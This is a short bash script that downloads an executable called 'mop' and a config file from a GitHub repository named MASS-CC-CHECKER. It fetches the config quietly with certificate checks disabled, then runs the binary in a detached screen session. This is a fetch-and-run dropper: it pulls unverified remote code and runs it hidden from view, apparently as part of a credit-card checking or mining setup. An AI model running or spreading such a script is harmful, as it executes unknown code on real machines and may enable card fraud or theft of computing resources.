#!/bin/bash
wget https://raw.githubusercontent.com/maklinngf/MASS-CC-CHECKER/refs/heads/main/mop
chmod u+x mop
wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/maklinngf/MASS-CC-CHECKER/refs/heads/main/mop.json
screen -dmS task bash -c "./mop"
